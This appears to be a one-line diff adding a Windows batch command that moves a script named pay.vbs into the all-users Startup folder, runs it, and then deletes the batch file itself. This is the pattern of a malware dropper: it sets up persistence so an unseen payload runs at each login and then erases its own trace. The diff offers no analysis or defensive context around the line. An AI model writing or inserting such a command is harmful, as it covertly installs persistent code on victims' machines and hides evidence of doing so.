@@ -1,0 +1,1 @@
+move %~dp0pay.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\pay.vbs"&start "" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\pay.vbs"&DEL "%~f0"
